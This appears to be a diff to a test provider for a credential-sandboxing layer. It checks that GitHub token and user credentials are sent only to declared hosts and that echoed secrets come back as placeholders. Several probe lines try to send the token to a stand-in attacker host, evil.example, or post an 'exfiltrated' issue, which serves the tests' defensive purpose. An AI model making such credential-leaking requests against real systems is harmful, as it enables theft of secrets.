@@ -25,7 +25,8 @@ export default defineProvider({
   hosts: () => ["api.github.com", "uploads.example.com"],
   credentials: [
     { env: "GITHUB_TOKEN", hosts: ["api.github.com"] },
-    { env: "GITHUB_USER", hosts: ["api.github.com"] },
+    // An identity: not scrubbed from responses, and sent only as the user part of prrla-basic:.
+    { env: "GITHUB_USER", hosts: ["api.github.com"], secret: false },
   ],
   create(options, ctx) {
     return {
@@ -62,6 +63,14 @@ export default defineProvider({
           basicToUndeclaredHost: await attempt(async () => status(await ctx.fetch("https://evil.example/basic", { headers: { authorization: "prrla-basic:GITHUB_USER:GITHUB_TOKEN" } }))),
           basicToOtherDeclaredHost: await attempt(async () => status(await ctx.fetch("https://uploads.example.com/basic", { headers: { authorization: "prrla-basic:GITHUB_USER:GITHUB_TOKEN" } }))),
           globalFetch: await attempt(async () => status(await fetch("https://evil.example/global"))),
+          // The declared host echoes the token in every form it can: the child must see only placeholders.
+          echoForms: await attempt(async () => {
+            const r = await ctx.fetch("https://api.github.com/echo-forms", { headers: { authorization: token } });
+            return { url: r.url, header: r.headers.get("x-echo"), statusText: r.statusText, body: await r.text() };
+          }),
+          // A participant list naming the user (an identity) reads right: nothing in it is scrubbed.
+          identityEcho: await attempt(async () => (await ctx.fetch("https://api.github.com/participants", { headers: { authorization: "prrla-basic:GITHUB_USER:GITHUB_TOKEN" } })).text()),
+          identityAsToken: await attempt(async () => status(await ctx.fetch("https://api.github.com/echo", { headers: { authorization: "token prrla-cred:GITHUB_USER" } }))),
           post: await attempt(async () => status(await ctx.fetch("https://api.github.com/repos/acme/widgets/issues", { method: "POST", body: JSON.stringify({ title: "exfiltrated" }) }))),
           socket: options.socketPort
             ? await attempt(
